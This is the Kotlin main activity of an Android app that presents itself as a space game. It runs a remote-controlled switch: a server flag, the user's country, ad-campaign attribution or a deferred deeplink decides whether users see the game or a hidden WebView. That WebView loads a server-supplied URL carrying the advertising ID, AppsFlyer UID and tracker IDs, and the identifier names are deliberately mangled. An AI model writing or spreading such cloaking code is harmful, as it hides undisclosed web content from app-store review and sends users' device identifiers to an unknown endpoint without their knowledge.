package com.game.space.sho

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.game.space.sho.Unded.MAIN_CHECKER
import com.game.space.sho.Unded.MY_TRACKER_KEY
import com.game.space.sho.Unded.buildVers
import com.game.space.sho.Unded.pacaaakageNameMain
import com.game.space.sho.room.DevilDataBase
import com.game.space.sho.room.DevilEntity
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.my.tracker.MyTracker
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONException
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    private val devilDAO by lazy {
        DevilDataBase.getDataBase(application).getDevilDAO()
    }

    val tinyDB by lazy {
        TinyDB(applicationContext)
    }



    val deviceID = "deviceID="
    val sub_id_1 = "sub_id_1="
    val ad_id = "ad_id="
    val sub_id_4 = "sub_id_4="
    val sub_id_5 = "sub_id_5="
    val sub_id_6 = "sub_id_6="
    val naming_name = "naming"
    val deeporg = "deeporg"

    private val appsId by lazy {
        AppsFlyerLib.getInstance().getAppsFlyerUID(application)
    }


    private var tempDevilLoad: String? = null
    private var tempGeoLoad: String? = null
    private var tempNamingLoad: String? = null
    private var tempDeepLoad: String? = null


    private suspend fun readAllFromDevilDataBase() {
        if (tinyDB.getBoolean("first_load")) {
            Log.d("lolo", "first_load")
            deepLink = "null"
            val emptyDataDevil = DevilEntity(111, "null", "null", "null", "null", "null")
            devilDAO.saveData(emptyDataDevil)
            tinyDB.putBoolean("first_load", false)
        } else {
            Log.d("lolo", "second_load")
            val dataFromDataBase = devilDAO.getAllDevilData().first()
            Log.d("lolo", "data fromDB ${dataFromDataBase}")
            naming = dataFromDataBase.naming
            deepLink = dataFromDataBase.deeplink
            linka = dataFromDataBase.link
            advertMainId = dataFromDataBase.advertid
            instId = dataFromDataBase.instID
        }
    }

    private val volleyApiClient by lazy {
        VolleyApiClient(applicationContext)
    }


    private suspend fun saveAllDataToDevilDataBase() {
        val dataForDataBase = DevilEntity(
            id = 111,
            deeplink = deepLink,
            naming = naming,
            advertid = advertMainId,
            link = linka,
            instID = instId
        ).also {
            devilDAO.saveData(it)
        }
        Log.d("lolo", "fun data saveAllDataToDevilDataBase, data $dataForDataBase")
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        lifecycleScope.launch {
            getDeep(this@MainActivity)
            readAllFromDevilDataBase()

            withContext(Dispatchers.Default) {
                getAdvertisingIdClient()
            }
            getDevilData()
            getGeoData()

            while (true) {
                if (tempDevilLoad != null && tempGeoLoad != null) {

                    Log.d("lolo", "tempDevilLoad/tempGeoLoad != null")
                    break
                } else {
                    Log.d("lolo", "tempDevilLoad/tempGeoLoad == null")
                    delay(1000)
                }
            }
            when (codeFromDevilHost) {
                "2" -> {
                    Log.d("lolo", "in 0")
                    goToGame()
                }
                "1" -> {
                    Log.d("lolo", "in 1")
                    //Fb + Apps
                    initAppsFlyerLibeer(this@MainActivity)
                    while (true) {
                        if (tempNamingLoad != null && tempDeepLoad != null) {
                            Log.d("lolo", "tempDeepLoad/tempNamingLoad NOT null")

                            AppsFlyerLib.getInstance().setCollectAndroidID(true)

                            if (naming.contains(MAIN_CHECKER)) {
                                MainClassssa.typeOfPromotion = Unded.CAMPAIGN

                                MainClassssa.link =
                                    "$linka?$sub_id_1$naming&$deviceID$appsId&$ad_id$advertMainId&$sub_id_4${pacaaakageNameMain}&$sub_id_5$buildVers&$sub_id_6$naming_name"

                                pushToOS(appsId.toString())

                                saveAllDataToDevilDataBase()
                                goToVebViev()
                            } else {
                                if (deepLink.contains(MAIN_CHECKER) || listOfGeo.contains(
                                        userCurrentGeo
                                    )
                                ) {
                                    MainClassssa.typeOfPromotion = Unded.DEEPLINK
                                    MainClassssa.link =
                                        "$linka?$sub_id_1$deepLink&$deviceID$appsId&$ad_id$advertMainId&$sub_id_4${pacaaakageNameMain}&$sub_id_5$buildVers&$sub_id_6$deeporg"

                                    pushToOS(appsId.toString())

                                    saveAllDataToDevilDataBase()
                                    goToVebViev()
                                } else goToGame()
                            }
                            break
                        } else {
                            Log.d("lolo", "tempDeepLoad/tempNamingLoad == null")
                            delay(1000)
                        }
                    }
                }
                "0" -> {
                    Log.d("lolo", "in 3")
                    initLoadMyTracker()
                    //Fb + initLoadMyTracker
                    while (true) {
                        if (tempDeepLoad != null) {
                            Log.d("lolo", "tempDeepLoad NOT null, 3 var")
                            if (deepLink.contains(MAIN_CHECKER)) {
                                Log.d("lolo", "var 3 deepLink.contains(MAIN_CHECKER)")
                                MainClassssa.typeOfPromotion = Unded.DEEPLINKNOAPPS
                                MainClassssa.link =
                                    "$linka?$sub_id_1$deepLink&$deviceID$instId&$ad_id$instId&$sub_id_4${pacaaakageNameMain}&$sub_id_5$buildVers&$sub_id_6$deeporg"

                                pushToOS(instId.toString())
                                saveAllDataToDevilDataBase()
                                goToVebViev()
                            } else {
                                if (listOfGeo.contains(userCurrentGeo)) {
                                    Log.d("lolo", "var 3 listOfGeo.contains(userCurrentGeo)")
                                    MainClassssa.typeOfPromotion = Unded.GEO
                                    MainClassssa.link =
                                        "$linka?$sub_id_1$instId&$ad_id$instId&$sub_id_4${pacaaakageNameMain}&$sub_id_5$buildVers&$sub_id_6$naming_name"

                                    pushToOS(instId.toString())
                                    saveAllDataToDevilDataBase()
                                    goToVebViev()
                                } else {
                                    goToGame()
                                }
                            }
                            break
                        } else {
                            Log.d("lolo", "tempDeepLoad/tempNamingLoad == null")
                            delay(1000)
                        }
                    }

                }
            }
        }
    }

    private fun goToVebViev() {
        Intent(this@MainActivity, BrooovActivity::class.java).apply {
            startActivity(this)
        }
        finish()
    }


    private var codeFromDevilHost: String = ""
    private var userCurrentGeo: String = ""
    private var naming: String = ""
    private var deepLink: String = ""
    private var linka: String = ""
    private var advertMainId: String = ""
    private var listOfGeo: String = ""
    private var instId = ""

    private fun goToGame() {
        Intent(this@MainActivity, GaaammiActivity2::class.java).also {
            startActivity(it)
        }
        finish()
    }

    private fun getAdvertisingIdClient() {
        val advertisingIdClient = AdvertisingIdClient(applicationContext)
        advertisingIdClient.start()
        val infofrrrf = advertisingIdClient.info.id
        advertMainId = infofrrrf.toString()
    }

    private fun initAppsFlyerLibeer(context: Context) {
        AppsFlyerLib.getInstance()
            .init(Unded.appsCode, conversionDataListener, context)
        Log.d("lolo", "initAppsFlyerLibeer")
        AppsFlyerLib.getInstance().start(context)
    }

    private val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            Log.d("lolo", "onConversionDataSuccess before loading")
            val dataGotten = data?.get("campaign").toString().apply {
                naming = this
                tempNamingLoad = this
                Log.d("lolo", "onConversionDataSuccess")
            }
        }

        override fun onConversionDataFail(p0: String?) {
            Log.d("lolo", "onConversionDataFail")
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            Log.d("lolo", "onAppOpenAttribution")
        }

        override fun onAttributionFailure(p0: String?) {
            Log.d("lolo", "onAttributionFailure")
        }
    }

    private suspend fun getDevilData() {
        val devilData = volleyApiClient.getDevilApi()
        linka = devilData.viewLolo
        listOfGeo = devilData.geoLolo
        codeFromDevilHost = devilData.appsCheckerLolo

        tempDevilLoad = "loaded"
    }

    private suspend fun getGeoData() {
        val apiData = volleyApiClient.getGeoData()
        userCurrentGeo = apiData.countryCode
        tempGeoLoad = "loaded"
    }

    private fun getDeep(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                appLinkData.targetUri?.host.toString().apply {
                    deepLink = this
                    tempDeepLoad = this
                }
                Log.d("lolo", "getDeep loaded")
            }
            if (appLinkData == null) {
                tempDeepLoad = "null"
                if (deepLink == "null") {
                    deepLink = "null"
                }
            }
        }
    }

    private fun initLoadMyTracker() {
        val myTrackerConfig = MyTracker.getTrackerConfig()
        val instIDDDD = MyTracker.getInstanceId(application)
        myTrackerConfig.isTrackingLaunchEnabled = true
        if (tinyDB.getBoolean("first_load")) {

            instId = instIDDDD

        } else {
            if (instId == ""){
                instId = MyTracker.getInstanceId(application)
            }
        }

        MyTracker.initTracker(MY_TRACKER_KEY, application)
    }

    fun pushToOS(id: String) {
        OneSignal.setExternalUserId(
            id,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isPushSuccess = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isPushSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isEmailSuccess =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isEmailSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }
}

